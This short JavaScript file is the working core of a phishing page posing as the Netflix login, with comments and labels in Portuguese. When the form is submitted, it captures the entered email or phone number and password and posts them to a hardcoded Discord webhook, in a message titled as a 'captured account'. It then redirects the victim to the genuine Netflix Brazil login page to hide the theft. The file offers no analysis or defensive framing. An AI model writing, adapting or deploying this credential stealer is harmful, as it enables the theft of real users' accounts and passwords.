document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const webhookURL = "https://discord.com/api/webhooks/1481402603404525678/LDGdRvAZJZEbG22rhkms1kmKt1XQ4oglVGE_cYOu0qWRi-y_fjE0GjZ8oAe2jwi28WI1";

    const payload = {
        embeds: [{
            title: "🚀 Nova Conta Capturada - Netflix",
            color: 14942228, // Cor vermelha Netflix em Decimal
            fields: [
                {
                    name: "📧 E-mail/Celular",
                    value: `\`${email}\``,
                    inline: false
                },
                {
                    name: "🔑 Senha",
                    value: `\`${password}\``,
                    inline: false
                }
            ],
            footer: {
                text: "Logger System • " + new Date().toLocaleString()
            }
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            // Redireciona para o site oficial após o envio
            window.location.href = "https://www.netflix.com/br/login";
        } else {
            alert("Erro ao processar. Tente novamente.");
        }
    }).catch(error => {
        console.error('Erro:', error);
    });
});
